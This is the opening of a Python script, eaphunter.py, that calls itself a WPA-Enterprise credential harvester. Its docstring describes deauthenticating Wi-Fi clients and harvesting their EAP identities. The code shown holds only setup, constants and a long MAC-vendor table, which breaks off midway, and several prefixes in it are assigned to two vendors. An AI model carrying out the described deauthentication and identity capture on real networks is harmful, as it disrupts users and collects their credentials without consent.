#!/usr/bin/env python3
"""
eaphunter.py  —  WPA-EAP Credential Harvester

Continuously monitors clients on a WPA-Enterprise AP. Select a client
to deauthenticate, capture the EAP handshake, extract the server
certificate, and harvest the outer identity (username / domain).
Returns to monitoring after each attack.

Usage:  sudo python3 eaphunter.py -e <ESSID> -i <interface> [-o <dir>]
Deps:   iw  ip  (system)   scapy  cryptography  (pip)
"""

import argparse
import hashlib
import os
import re
import select as _select
import shutil
import signal
import subprocess
import sys
import tempfile
import threading
import time
import warnings
from pathlib import Path

# ── Scapy: lazy import, all deprecation warnings suppressed ──────────────────
_sc = None

def _require_scapy():
    global _sc
    if _sc is not None:
        return
    warnings.filterwarnings("ignore", category=DeprecationWarning)
    warnings.filterwarnings("ignore", category=UserWarning)
    try:
        import logging
        logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
        import scapy.all as sc
        _sc = sc
    except ImportError:
        die("scapy not installed: pip install scapy")


# ── Constants ─────────────────────────────────────────────────────────────────
EAP_METHODS = {
    4: "EAP-MD5",   13: "EAP-TLS",   17: "LEAP",
    18: "EAP-SIM",  21: "EAP-TTLS",  25: "EAP-PEAP",
    26: "MS-CHAPv2", 43: "EAP-FAST", 50: "EAP-PWD",
}

CHANNELS = list(range(1, 14)) + [
    36, 40, 44, 48, 52, 56, 60, 64,
    100, 104, 108, 112, 149, 153, 157, 161, 165,
]

SNIFF_SLICE = 2   # seconds per background sniff burst


# ── Output ────────────────────────────────────────────────────────────────────
def info(msg):  print(f"  [*] {msg}")
def ok(msg):    print(f"  [+] {msg}")
def warn(msg):  print(f"  [!] {msg}")
def die(msg):   print(f"  [x] {msg}", file=sys.stderr); sys.exit(1)

def section(title: str):
    bar = "-" * 62
    print(f"\n  {bar}\n  {title}\n  {bar}")

def _countdown_thread(msg: str, secs: int, done: threading.Event):
    for remaining in range(secs, 0, -1):
        if done.is_set():
            break
        print(f"\r  [*] {msg} [{remaining:2d}s]  ", end="", flush=True)
        time.sleep(1)
    print(f"\r  [+] {msg} [done]       ")


# ── Baked-in OUI → vendor table ──────────────────────────────────────────────
_BUILTIN_OUI: dict[str, str] = {
    # Apple
    "00:03:93": "Apple", "00:0A:27": "Apple", "00:0A:95": "Apple",
    "00:11:24": "Apple", "00:14:51": "Apple", "00:16:CB": "Apple",
    "00:17:F2": "Apple", "00:19:E3": "Apple", "00:1B:63": "Apple",
    "00:1C:B3": "Apple", "00:1D:4F": "Apple", "00:1E:52": "Apple",
    "00:1E:C2": "Apple", "00:1F:5B": "Apple", "00:1F:F3": "Apple",
    "00:21:E9": "Apple", "00:22:41": "Apple", "00:23:12": "Apple",
    "00:23:32": "Apple", "00:23:6C": "Apple", "00:23:DF": "Apple",
    "00:24:36": "Apple", "00:25:00": "Apple", "00:25:4B": "Apple",
    "00:25:BC": "Apple", "00:26:08": "Apple", "00:26:4A": "Apple",
    "00:26:B0": "Apple", "00:26:BB": "Apple", "04:52:F3": "Apple",
    "04:D3:CF": "Apple", "08:6D:41": "Apple", "0C:3E:9F": "Apple",
    "0C:74:C2": "Apple", "10:40:F3": "Apple", "10:93:E9": "Apple",
    "14:10:9F": "Apple", "18:20:32": "Apple", "18:34:51": "Apple",
    "18:65:90": "Apple", "18:9E:FC": "Apple", "18:AF:61": "Apple",
    "1C:1A:C0": "Apple", "1C:36:BB": "Apple", "1C:E6:2B": "Apple",
    "20:3C:AE": "Apple", "20:76:8F": "Apple", "20:78:F0": "Apple",
    "20:9B:CD": "Apple", "20:AB:37": "Apple", "24:1E:EB": "Apple",
    "24:AB:81": "Apple", "28:0B:5C": "Apple", "28:37:37": "Apple",
    "28:6A:B8": "Apple", "28:CF:DA": "Apple", "28:CF:E9": "Apple",
    "2C:BE:08": "Apple", "2C:F0:EE": "Apple", "30:35:AD": "Apple",
    "30:90:AB": "Apple", "34:08:BC": "Apple", "34:51:C9": "Apple",
    "34:C0:59": "Apple", "38:0F:4A": "Apple", "38:71:DE": "Apple",
    "38:B5:4D": "Apple", "3C:07:54": "Apple", "3C:15:C2": "Apple",
    "3C:D0:F8": "Apple", "40:30:04": "Apple", "40:6C:8F": "Apple",
    "40:98:AD": "Apple", "40:A6:D9": "Apple", "40:B3:95": "Apple",
    "44:2A:60": "Apple", "44:4C:0C": "Apple", "44:D8:84": "Apple",
    "44:FB:42": "Apple", "48:43:7C": "Apple", "48:60:BC": "Apple",
    "48:74:6E": "Apple", "48:BF:6B": "Apple", "4C:57:CA": "Apple",
    "4C:8D:79": "Apple", "50:32:75": "Apple", "50:82:D5": "Apple",
    "50:BC:96": "Apple", "50:EA:D6": "Apple", "54:26:96": "Apple",
    "54:4E:90": "Apple", "54:AE:27": "Apple", "58:40:4E": "Apple",
    "58:7F:57": "Apple", "5C:59:48": "Apple", "5C:96:9D": "Apple",
    "5C:F7:E6": "Apple", "5C:F9:38": "Apple", "60:33:4B": "Apple",
    "60:C5:47": "Apple", "60:D9:C7": "Apple", "60:F4:45": "Apple",
    "64:5A:04": "Apple", "64:76:BA": "Apple", "64:9A:BE": "Apple",
    "64:A3:CB": "Apple", "64:B9:E8": "Apple", "68:5B:35": "Apple",
    "68:96:7B": "Apple", "68:9C:70": "Apple", "68:D9:3C": "Apple",
    "6C:40:08": "Apple", "6C:70:9F": "Apple", "6C:72:E7": "Apple",
    "6C:94:F8": "Apple", "6C:96:CF": "Apple", "70:14:A6": "Apple",
    "70:3E:AC": "Apple", "70:56:81": "Apple", "70:73:CB": "Apple",
    "70:81:EB": "Apple", "70:CD:60": "Apple", "70:EC:E4": "Apple",
    "74:1B:B2": "Apple", "74:8D:08": "Apple", "74:E1:B6": "Apple",
    "78:31:C1": "Apple", "78:4F:43": "Apple", "78:67:D7": "Apple",
    "78:6C:1C": "Apple", "78:7E:61": "Apple", "78:9F:70": "Apple",
    "78:CA:39": "Apple", "7C:04:D0": "Apple", "7C:6D:62": "Apple",
    "7C:C3:A1": "Apple", "7C:D1:C3": "Apple", "80:00:6E": "Apple",
    "80:49:71": "Apple", "80:82:23": "Apple", "80:BE:05": "Apple",
    "80:E6:50": "Apple", "84:29:99": "Apple", "84:38:35": "Apple",
    "84:78:8B": "Apple", "84:85:06": "Apple", "84:A1:34": "Apple",
    "84:B1:53": "Apple", "84:FC:FE": "Apple", "88:19:08": "Apple",
    "88:53:95": "Apple", "88:63:DF": "Apple", "88:66:A5": "Apple",
    "88:AE:07": "Apple", "8C:2D:AA": "Apple", "8C:58:77": "Apple",
    "8C:85:90": "Apple", "90:27:E4": "Apple", "90:3C:92": "Apple",
    "90:60:F0": "Apple", "90:72:40": "Apple", "90:84:0D": "Apple",
    "90:B0:ED": "Apple", "90:C1:C6": "Apple", "94:BF:2D": "Apple",
    "94:E9:6A": "Apple", "94:F6:65": "Apple", "98:01:A7": "Apple",
    "98:46:0A": "Apple", "98:5A:EB": "Apple", "98:B8:E3": "Apple",
    "98:CA:33": "Apple", "98:D6:BB": "Apple", "9C:04:EB": "Apple",
    "9C:20:7B": "Apple", "9C:35:EB": "Apple", "9C:84:BF": "Apple",
    "9C:FC:01": "Apple", "A0:18:28": "Apple", "A0:3B:E3": "Apple",
    "A0:4E:A7": "Apple", "A0:99:9B": "Apple", "A0:D7:95": "Apple",
    "A4:5E:60": "Apple", "A4:67:06": "Apple", "A4:B1:97": "Apple",
    "A4:C3:61": "Apple", "A4:D1:8C": "Apple", "A4:F1:E8": "Apple",
    "A8:20:66": "Apple", "A8:5C:2C": "Apple", "A8:60:B6": "Apple",
    "A8:86:DD": "Apple", "A8:FA:D8": "Apple", "AC:29:3A": "Apple",
    "AC:3C:0B": "Apple", "AC:61:EA": "Apple", "AC:87:A3": "Apple",
    "AC:BC:32": "Apple", "AC:CF:85": "Apple", "B0:34:95": "Apple",
    "B0:65:BD": "Apple", "B0:70:2D": "Apple", "B0:9F:BA": "Apple",
    "B4:18:D1": "Apple", "B4:8B:19": "Apple", "B4:F0:AB": "Apple",
    "B8:17:C2": "Apple", "B8:41:A4": "Apple", "B8:8D:12": "Apple",
    "B8:C7:5D": "Apple", "B8:E8:56": "Apple", "BC:3B:AF": "Apple",
    "BC:52:B7": "Apple", "BC:67:1C": "Apple", "BC:92:6B": "Apple",
    "C0:63:94": "Apple", "C0:84:7A": "Apple", "C0:9F:42": "Apple",
    "C0:CE:CD": "Apple", "C0:D0:12": "Apple", "C4:2C:03": "Apple",
    "C4:B3:01": "Apple", "C8:2A:14": "Apple", "C8:33:4B": "Apple",
    "C8:3C:85": "Apple", "C8:6F:1D": "Apple", "C8:85:50": "Apple",
    "C8:BC:C8": "Apple", "C8:D0:83": "Apple", "CC:08:8D": "Apple",
    "CC:29:F5": "Apple", "CC:44:63": "Apple", "D0:03:4B": "Apple",
    "D0:23:DB": "Apple", "D0:33:11": "Apple", "D0:4F:7E": "Apple",
    "D0:A6:37": "Apple", "D4:61:9D": "Apple", "D4:90:9C": "Apple",
    "D8:00:4D": "Apple", "D8:1D:72": "Apple", "D8:30:62": "Apple",
    "D8:96:95": "Apple", "D8:A2:5E": "Apple", "D8:BB:2C": "Apple",
    "DC:2B:2A": "Apple", "DC:37:14": "Apple", "DC:9B:9C": "Apple",
    "E0:AC:CB": "Apple", "E0:B5:2D": "Apple", "E0:C9:7A": "Apple",
    "E0:F5:C6": "Apple", "E4:25:E7": "Apple", "E4:8B:7F": "Apple",
    "E4:9A:DC": "Apple", "E4:CE:8F": "Apple", "E4:E4:AB": "Apple",
    "E8:04:0B": "Apple", "E8:06:88": "Apple", "E8:80:2E": "Apple",
    "E8:8D:28": "Apple", "EC:35:86": "Apple", "EC:85:2F": "Apple",
    "F0:18:98": "Apple", "F0:24:75": "Apple", "F0:4F:7C": "Apple",
    "F0:B4:79": "Apple", "F0:CB:A1": "Apple", "F0:D1:A9": "Apple",
    "F0:DB:E2": "Apple", "F0:DC:E2": "Apple", "F4:0F:24": "Apple",
    "F4:1B:A1": "Apple", "F4:37:B7": "Apple", "F4:5C:89": "Apple",
    "F8:03:77": "Apple", "F8:1E:DF": "Apple", "F8:27:93": "Apple",
    "F8:62:14": "Apple", "FC:25:3F": "Apple", "FC:E9:98": "Apple",
    # Samsung
    "00:07:AB": "Samsung", "00:12:47": "Samsung", "00:12:FB": "Samsung",
    "00:15:99": "Samsung", "00:15:B9": "Samsung", "00:16:32": "Samsung",
    "00:16:6B": "Samsung", "00:16:6C": "Samsung", "00:17:C9": "Samsung",
    "00:17:D5": "Samsung", "00:18:AF": "Samsung", "00:1A:8A": "Samsung",
    "00:1B:98": "Samsung", "00:1C:43": "Samsung", "00:1D:25": "Samsung",
    "00:1D:F6": "Samsung", "00:1E:7D": "Samsung", "00:21:19": "Samsung",
    "00:21:4C": "Samsung", "00:21:D1": "Samsung", "00:23:39": "Samsung",
    "00:23:99": "Samsung", "00:24:54": "Samsung", "00:24:91": "Samsung",
    "00:25:38": "Samsung", "00:25:66": "Samsung", "00:25:67": "Samsung",
    "08:08:C2": "Samsung", "08:D4:2B": "Samsung", "08:EC:A9": "Samsung",
    "0C:14:20": "Samsung", "0C:71:5D": "Samsung", "10:1D:C0": "Samsung",
    "10:30:47": "Samsung", "10:D5:42": "Samsung", "14:32:D1": "Samsung",
    "18:22:7E": "Samsung", "18:3A:2D": "Samsung", "18:46:17": "Samsung",
    "1C:5A:3E": "Samsung", "1C:62:B8": "Samsung", "1C:66:AA": "Samsung",
    "20:13:E0": "Samsung", "20:55:31": "Samsung", "20:6E:9C": "Samsung",
    "24:4B:03": "Samsung", "24:C6:96": "Samsung", "24:DB:AC": "Samsung",
    "28:27:BF": "Samsung", "28:98:7B": "Samsung", "2C:AE:2B": "Samsung",
    "30:19:66": "Samsung", "30:96:3B": "Samsung", "34:14:5F": "Samsung",
    "38:01:97": "Samsung", "38:16:D1": "Samsung", "38:2D:D1": "Samsung",
    "3C:62:00": "Samsung", "3C:8B:FE": "Samsung", "40:0E:85": "Samsung",
    "40:4E:36": "Samsung", "44:78:3E": "Samsung", "44:F4:59": "Samsung",
    "48:13:7E": "Samsung", "4C:3C:16": "Samsung", "4C:BC:A5": "Samsung",
    "50:01:BB": "Samsung", "50:32:37": "Samsung", "50:CC:F8": "Samsung",
    "54:88:0E": "Samsung", "54:92:BE": "Samsung", "58:DB:C4": "Samsung",
    "5C:0A:5B": "Samsung", "5C:F6:DC": "Samsung", "60:A1:0A": "Samsung",
    "64:6C:B2": "Samsung", "64:77:91": "Samsung", "68:27:37": "Samsung",
    "6C:2F:2C": "Samsung", "6C:83:36": "Samsung", "70:F9:27": "Samsung",
    "78:1F:DB": "Samsung", "78:25:AD": "Samsung", "78:40:E4": "Samsung",
    "7C:0B:C6": "Samsung", "7C:61:66": "Samsung", "80:57:19": "Samsung",
    "84:11:9E": "Samsung", "84:25:DB": "Samsung", "84:55:A5": "Samsung",
    "88:32:9B": "Samsung", "8C:71:F8": "Samsung", "8C:77:12": "Samsung",
    "94:35:0A": "Samsung", "94:63:D1": "Samsung", "98:52:B1": "Samsung",
    "9C:02:98": "Samsung", "A0:07:98": "Samsung", "A0:82:1F": "Samsung",
    "A4:07:B6": "Samsung", "A8:06:00": "Samsung", "A8:74:1D": "Samsung",
    "AC:36:13": "Samsung", "AC:5A:FC": "Samsung", "B0:72:BF": "Samsung",
    "B0:D0:9C": "Samsung", "B4:07:F9": "Samsung", "B4:3A:28": "Samsung",
    "B8:5E:7B": "Samsung", "BC:20:A4": "Samsung", "BC:44:86": "Samsung",
    "BC:72:B1": "Samsung", "BC:8C:CD": "Samsung", "C0:BD:D1": "Samsung",
    "C4:42:02": "Samsung", "C4:50:06": "Samsung", "C4:62:EA": "Samsung",
    "C8:0F:10": "Samsung", "CC:07:AB": "Samsung", "D0:22:BE": "Samsung",
    "D0:59:E4": "Samsung", "D0:87:E2": "Samsung", "D4:87:D8": "Samsung",
    "D4:88:90": "Samsung", "D8:57:EF": "Samsung", "D8:90:E8": "Samsung",
    "DC:71:96": "Samsung", "E0:99:71": "Samsung", "E8:50:8B": "Samsung",
    "EC:1F:72": "Samsung", "EC:9B:F3": "Samsung", "F0:25:B7": "Samsung",
    "F0:5A:09": "Samsung", "F0:72:8C": "Samsung", "F4:42:8F": "Samsung",
    "F8:04:2E": "Samsung", "FC:A1:3E": "Samsung", "FC:F1:36": "Samsung",
    # Intel (WiFi adapters — very common in laptops)
    "00:02:B3": "Intel",  "00:03:47": "Intel",  "00:04:23": "Intel",
    "00:07:E9": "Intel",  "00:0C:E7": "Intel",  "00:0D:60": "Intel",
    "00:0E:35": "Intel",  "00:11:11": "Intel",  "00:12:F0": "Intel",
    "00:13:02": "Intel",  "00:13:20": "Intel",  "00:13:E8": "Intel",
    "00:15:00": "Intel",  "00:16:76": "Intel",  "00:16:EA": "Intel",
    "00:16:EB": "Intel",  "00:18:DE": "Intel",  "00:19:D1": "Intel",
    "00:19:D2": "Intel",  "00:1B:21": "Intel",  "00:1B:77": "Intel",
    "00:1C:BF": "Intel",  "00:1D:E0": "Intel",  "00:1D:E1": "Intel",
    "00:1E:64": "Intel",  "00:1E:65": "Intel",  "00:1F:3A": "Intel",
    "00:1F:3B": "Intel",  "00:1F:3C": "Intel",  "00:21:5C": "Intel",
    "00:21:5D": "Intel",  "00:22:FA": "Intel",  "00:22:FB": "Intel",
    "00:23:14": "Intel",  "00:24:D6": "Intel",  "00:24:D7": "Intel",
    "00:27:10": "Intel",  "04:0E:3C": "Intel",  "08:11:96": "Intel",
    "10:02:B5": "Intel",  "10:4A:7D": "Intel",  "18:03:73": "Intel",
    "24:77:03": "Intel",  "28:D2:44": "Intel",  "34:02:86": "Intel",
    "34:13:E8": "Intel",  "40:25:C2": "Intel",  "44:85:00": "Intel",
    "48:51:B7": "Intel",  "4C:34:88": "Intel",  "50:7B:9D": "Intel",
    "54:35:30": "Intel",  "5C:F3:70": "Intel",  "60:57:18": "Intel",
    "60:F6:77": "Intel",  "64:00:6A": "Intel",  "64:80:99": "Intel",
    "68:05:CA": "Intel",  "6C:88:14": "Intel",  "70:77:81": "Intel",
    "74:29:AF": "Intel",  "78:92:9C": "Intel",  "7C:7A:91": "Intel",
    "80:19:34": "Intel",  "84:3A:4B": "Intel",  "88:53:2E": "Intel",
    "8C:8D:28": "Intel",  "90:48:9A": "Intel",  "94:65:9C": "Intel",
    "98:4F:EE": "Intel",  "A0:36:9F": "Intel",  "A0:A8:CD": "Intel",
    "A4:34:D9": "Intel",  "A4:4E:31": "Intel",  "A4:C3:F0": "Intel",
    "AC:7B:A1": "Intel",  "B0:C4:E7": "Intel",  "B4:6B:FC": "Intel",
    "B8:08:CF": "Intel",  "B8:63:4D": "Intel",  "BC:77:37": "Intel",
    "C8:FF:28": "Intel",  "CC:3D:82": "Intel",  "D0:50:99": "Intel",
    "D0:AB:D5": "Intel",  "D4:3D:7E": "Intel",  "D8:FC:93": "Intel",
    "DC:53:60": "Intel",  "E8:2A:EA": "Intel",  "E8:B1:FC": "Intel",
    "EC:08:6B": "Intel",  "F0:DE:F1": "Intel",  "F4:06:69": "Intel",
    # Dell
    "00:06:5B": "Dell",  "00:08:74": "Dell",  "00:0B:DB": "Dell",
    "00:0D:56": "Dell",  "00:0F:1F": "Dell",  "00:11:43": "Dell",
    "00:12:3F": "Dell",  "00:13:72": "Dell",  "00:14:22": "Dell",
    "00:15:C5": "Dell",  "00:16:F0": "Dell",  "00:18:8B": "Dell",
    "00:19:B9": "Dell",  "00:1A:A0": "Dell",  "00:1C:23": "Dell",
    "00:1D:09": "Dell",  "00:1E:4F": "Dell",  "00:21:70": "Dell",
    "00:22:19": "Dell",  "00:23:AE": "Dell",  "00:24:E8": "Dell",
    "00:25:64": "Dell",  "00:26:B9": "Dell",  "18:03:73": "Dell",
    "18:FB:7B": "Dell",  "1C:40:24": "Dell",  "20:47:47": "Dell",
    "24:B6:FD": "Dell",  "28:F1:0E": "Dell",  "34:17:EB": "Dell",
    "44:A8:42": "Dell",  "4C:D9:8F": "Dell",  "50:9A:4C": "Dell",
    "54:9F:35": "Dell",  "5C:F9:DD": "Dell",  "60:36:DD": "Dell",
    "78:2B:CB": "Dell",  "78:45:C4": "Dell",  "84:7B:EB": "Dell",
    "90:B1:1C": "Dell",  "98:90:96": "Dell",  "A4:1F:72": "Dell",
    "A4:BB:6D": "Dell",  "B0:83:FE": "Dell",  "B4:45:06": "Dell",
    "B8:2A:72": "Dell",  "BC:30:5B": "Dell",  "C8:1F:66": "Dell",
    "D4:AE:52": "Dell",  "D4:BE:D9": "Dell",  "D8:9E:F3": "Dell",
    "E4:B9:7A": "Dell",  "E8:B0:C8": "Dell",  "F8:B1:56": "Dell",
    # HP / Hewlett-Packard
    "00:01:E6": "HP",  "00:01:E7": "HP",  "00:04:EA": "HP",
    "00:08:02": "HP",  "00:0A:57": "HP",  "00:0B:CD": "HP",
    "00:0D:9D": "HP",  "00:0E:7F": "HP",  "00:10:83": "HP",
    "00:11:0A": "HP",  "00:12:79": "HP",  "00:13:21": "HP",
    "00:14:38": "HP",  "00:14:C2": "HP",  "00:15:60": "HP",
    "00:16:35": "HP",  "00:17:08": "HP",  "00:18:71": "HP",
    "00:19:BB": "HP",  "00:1A:4B": "HP",  "00:1B:78": "HP",
    "00:1C:C4": "HP",  "00:1E:0B": "HP",  "00:1F:29": "HP",
    "00:21:5A": "HP",  "00:22:64": "HP",  "00:23:7D": "HP",
    "00:25:B3": "HP",  "00:26:55": "HP",  "10:1F:74": "HP",
    "18:A9:05": "HP",  "1C:C1:DE": "HP",  "24:BE:05": "HP",
    "28:92:4A": "HP",  "2C:27:D7": "HP",  "30:8D:99": "HP",
    "34:64:A9": "HP",  "3C:52:82": "HP",  "3C:D9:2B": "HP",
    "40:B0:34": "HP",  "48:0F:CF": "HP",  "50:65:F3": "HP",
    "58:20:B1": "HP",  "5C:B9:01": "HP",  "60:EB:69": "HP",
    "64:51:06": "HP",  "6C:C2:17": "HP",  "70:5A:0F": "HP",
    "78:E3:B5": "HP",  "80:C1:6E": "HP",  "94:57:A5": "HP",
    "9C:8E:99": "HP",  "A0:B3:CC": "HP",  "A0:D3:C1": "HP",
    "AC:16:2D": "HP",  "B4:B5:2F": "HP",  "C4:34:6B": "HP",
    "D8:D3:85": "HP",  "E8:39:DF": "HP",  "F0:92:1C": "HP",
    # Lenovo
    "00:09:2D": "Lenovo", "10:65:30": "Lenovo", "20:89:84": "Lenovo",
    "28:D2:44": "Lenovo", "2C:44:FD": "Lenovo", "38:B1:DB": "Lenovo",
    "40:2C:76": "Lenovo", "48:0F:CF": "Lenovo", "4C:00:82": "Lenovo",
    "54:EE:75": "Lenovo", "58:8F:E8": "Lenovo", "5C:F3:FC": "Lenovo",
    "60:02:B4": "Lenovo", "60:6B:FF": "Lenovo", "68:F7:28": "Lenovo",
    "70:5A:B6": "Lenovo", "74:04:F1": "Lenovo", "84:7B:57": "Lenovo",
    "88:70:8C": "Lenovo", "90:7F:61": "Lenovo", "98:FA:9B": "Lenovo",
    "A0:48:1C": "Lenovo", "AC:B3:13": "Lenovo", "C0:3F:D5": "Lenovo",
    "C8:5B:76": "Lenovo", "D0:53:49": "Lenovo", "D4:81:D7": "Lenovo",
    "E0:94:67": "Lenovo", "E8:6A:64": "Lenovo", "F0:DE:F1": "Lenovo",
    # Microsoft
    "00:03:FF": "Microsoft", "00:0D:3A": "Microsoft", "00:12:5A": "Microsoft",
    "00:15:5D": "Microsoft", "00:17:FA": "Microsoft", "00:1D:D8": "Microsoft",
    "00:22:48": "Microsoft", "00:50:F2": "Microsoft", "28:18:78": "Microsoft",
    "3C:83:75": "Microsoft", "48:C6:C8": "Microsoft", "5C:26:0A": "Microsoft",
    "60:45:BD": "Microsoft", "68:A8:6D": "Microsoft", "70:D3:79": "Microsoft",
    "7C:ED:8D": "Microsoft", "80:3F:5D": "Microsoft", "9C:B6:D0": "Microsoft",
    "A0:CE:C8": "Microsoft", "B0:35:9F": "Microsoft", "C8:3A:35": "Microsoft",
    "DC:41:A9": "Microsoft",
    # Google
    "00:1A:11": "Google",   "20:DF:B9": "Google",   "3C:5A:B4": "Google",
    "48:D6:D5": "Google",   "54:60:09": "Google",   "6C:AD:F8": "Google",
    "70:5C:7F": "Google",   "74:F6:1C": "Google",   "8C:5A:F8": "Google",
    "94:EB:2C": "Google",   "A4:77:33": "Google",   "AC:D1:B8": "Google",
    "D8:D1:CB": "Google",   "F4:F5:D8": "Google",   "F8:8F:CA": "Google",
    # Huawei
    "00:18:82": "Huawei",  "00:1E:10": "Huawei",  "00:25:9E": "Huawei",
    "00:46:4B": "Huawei",  "04:02:1F": "Huawei",  "04:B0:E7": "Huawei",
    "04:C0:6F": "Huawei",  "04:F9:38": "Huawei",  "08:7A:4C": "Huawei",
    "0C:37:DC": "Huawei",  "0C:96:BF": "Huawei",  "10:1B:54": "Huawei",
    "10:47:80": "Huawei",  "10:C6:1F": "Huawei",  "14:A5:1A": "Huawei",
    "18:C5:8A": "Huawei",  "1C:1D:67": "Huawei",  "20:0B:C7": "Huawei",
    "20:F3:A3": "Huawei",  "24:09:95": "Huawei",  "24:DB:ED": "Huawei",
    "28:31:52": "Huawei",  "28:3C:E4": "Huawei",  "2C:AB:00": "Huawei",
    "30:45:96": "Huawei",  "34:6B:D3": "Huawei",  "34:A2:B7": "Huawei",
    "38:37:8B": "Huawei",  "3C:47:11": "Huawei",  "3C:F8:08": "Huawei",
    "40:4D:8E": "Huawei",  "40:CB:A8": "Huawei",  "44:6A:2E": "Huawei",
    "48:00:31": "Huawei",  "48:DB:50": "Huawei",  "4C:1F:CC": "Huawei",
    "54:89:98": "Huawei",  "58:2A:F7": "Huawei",  "5C:C3:07": "Huawei",
    "60:DE:44": "Huawei",  "6C:8D:C1": "Huawei",  "70:72:3C": "Huawei",
    "70:7B:E8": "Huawei",  "78:1D:BA": "Huawei",  "7C:A2:3E": "Huawei",
    "80:D0:9B": "Huawei",  "80:FB:06": "Huawei",  "88:8F:DF": "Huawei",
    "90:17:3F": "Huawei",  "98:E7:F4": "Huawei",  "9C:74:1A": "Huawei",
    "A0:08:6F": "Huawei",  "AC:85:3D": "Huawei",  "B4:15:13": "Huawei",
    "BC:76:70": "Huawei",  "C0:70:CF": "Huawei",  "C4:07:2F": "Huawei",
    "C8:51:95": "Huawei",  "CC:96:A0": "Huawei",  "D4:6E:5C": "Huawei",
    "D8:C7:71": "Huawei",  "DC:D2:FC": "Huawei",  "E0:19:1D": "Huawei",
    "E0:24:7F": "Huawei",  "E4:68:A3": "Huawei",  "E8:CD:2D": "Huawei",
    "EC:38:70": "Huawei",  "F4:CB:52": "Huawei",  "F8:4A:BF": "Huawei",
    # Cisco
    "00:00:0C": "Cisco",  "00:01:42": "Cisco",  "00:01:43": "Cisco",
    "00:01:96": "Cisco",  "00:01:97": "Cisco",  "00:02:16": "Cisco",
    "00:02:17": "Cisco",  "00:02:3D": "Cisco",  "00:02:4A": "Cisco",
    "00:02:4B": "Cisco",  "00:03:6B": "Cisco",  "00:03:9F": "Cisco",
    "00:0A:41": "Cisco",  "00:0A:42": "Cisco",  "00:0A:8A": "Cisco",
    "00:0A:B7": "Cisco",  "00:0B:45": "Cisco",  "00:0B:46": "Cisco",
    "00:0C:CE": "Cisco",  "00:0C:CF": "Cisco",  "00:0D:28": "Cisco",
    "00:0D:29": "Cisco",  "00:0D:BC": "Cisco",  "00:0D:BD": "Cisco",
    "00:0E:08": "Cisco",  "00:0E:38": "Cisco",  "00:0E:83": "Cisco",
    "00:0E:84": "Cisco",  "00:0E:D7": "Cisco",  "00:0F:23": "Cisco",
    "00:0F:24": "Cisco",  "00:0F:34": "Cisco",  "00:0F:35": "Cisco",
    "00:0F:8F": "Cisco",  "00:0F:F7": "Cisco",  "00:0F:F8": "Cisco",
    "00:10:07": "Cisco",  "00:10:0B": "Cisco",  "00:10:11": "Cisco",
    "00:10:29": "Cisco",  "00:10:2F": "Cisco",  "00:10:54": "Cisco",
    "00:10:7B": "Cisco",  "00:10:79": "Cisco",  "00:10:A6": "Cisco",
    "00:10:F6": "Cisco",  "00:11:20": "Cisco",  "00:11:21": "Cisco",
    "00:11:5C": "Cisco",  "00:11:5D": "Cisco",  "00:11:92": "Cisco",
    "00:11:93": "Cisco",  "00:12:00": "Cisco",  "00:12:01": "Cisco",
    "00:12:43": "Cisco",  "00:12:7F": "Cisco",  "00:12:80": "Cisco",
    "00:13:10": "Cisco",  "00:13:19": "Cisco",  "00:13:1A": "Cisco",
    "00:13:5F": "Cisco",  "00:13:60": "Cisco",  "00:13:80": "Cisco",
    "00:13:C3": "Cisco",  "00:14:1B": "Cisco",  "00:14:1C": "Cisco",
    "00:14:69": "Cisco",  "00:14:6A": "Cisco",  "00:14:A9": "Cisco",
    "00:14:F1": "Cisco",  "00:14:F2": "Cisco",  "00:15:2B": "Cisco",
    "00:15:2C": "Cisco",  "00:15:62": "Cisco",  "00:15:63": "Cisco",
    "00:15:C6": "Cisco",  "00:15:C7": "Cisco",  "00:16:46": "Cisco",
    "00:16:47": "Cisco",  "00:16:9C": "Cisco",  "00:16:9D": "Cisco",
    "00:17:0E": "Cisco",  "00:17:0F": "Cisco",  "00:17:59": "Cisco",
    "00:17:5A": "Cisco",  "00:17:94": "Cisco",  "00:17:DF": "Cisco",
    "00:18:18": "Cisco",  "00:18:19": "Cisco",  "00:18:68": "Cisco",
    "00:18:B9": "Cisco",  "00:19:06": "Cisco",  "00:19:07": "Cisco",
    "00:19:2F": "Cisco",  "00:19:30": "Cisco",  "00:19:A9": "Cisco",
    "00:19:AA": "Cisco",  "00:1A:2F": "Cisco",  "00:1A:30": "Cisco",
    "00:1A:6C": "Cisco",  "00:1A:6D": "Cisco",  "00:1A:A1": "Cisco",
    "00:1A:E3": "Cisco",  "00:1B:0C": "Cisco",  "00:1B:0D": "Cisco",
    "00:1B:53": "Cisco",  "00:1B:54": "Cisco",  "00:1B:8F": "Cisco",
    "00:1B:D4": "Cisco",  "00:1B:D5": "Cisco",  "00:1C:10": "Cisco",
    "00:1C:11": "Cisco",  "00:1C:57": "Cisco",  "00:1C:58": "Cisco",
    "00:1C:B0": "Cisco",  "00:1D:45": "Cisco",  "00:1D:46": "Cisco",
    "00:1D:70": "Cisco",  "00:1D:A1": "Cisco",  "00:1D:A2": "Cisco",
    "00:1E:13": "Cisco",  "00:1E:14": "Cisco",  "00:1E:49": "Cisco",
    "00:1E:7A": "Cisco",  "00:1E:7B": "Cisco",  "00:1E:BD": "Cisco",
    "00:1F:26": "Cisco",  "00:1F:27": "Cisco",  "00:1F:6C": "Cisco",
    "00:1F:9E": "Cisco",  "00:1F:9F": "Cisco",  "00:1F:CA": "Cisco",
    "00:21:A0": "Cisco",  "00:21:A1": "Cisco",  "00:21:BE": "Cisco",
    "00:22:0C": "Cisco",  "00:22:0D": "Cisco",  "00:22:31": "Cisco",
    "00:22:55": "Cisco",  "00:22:56": "Cisco",  "00:22:6B": "Cisco",
    "00:22:90": "Cisco",  "00:22:91": "Cisco",  "00:22:BD": "Cisco",
    "00:23:04": "Cisco",  "00:23:33": "Cisco",  "00:23:34": "Cisco",
    "00:23:5E": "Cisco",  "00:23:5F": "Cisco",  "00:23:AC": "Cisco",
    "00:23:EA": "Cisco",  "00:23:EB": "Cisco",  "00:24:13": "Cisco",
    "00:24:14": "Cisco",  "00:24:97": "Cisco",  "00:24:98": "Cisco",
    "00:24:C3": "Cisco",  "00:24:C4": "Cisco",  "00:25:45": "Cisco",
    "00:25:46": "Cisco",  "00:25:84": "Cisco",  "00:25:B4": "Cisco",
    "00:26:0A": "Cisco",  "00:26:0B": "Cisco",  "00:26:CA": "Cisco",
    "00:26:CB": "Cisco",  "00:30:19": "Cisco",  "00:30:71": "Cisco",
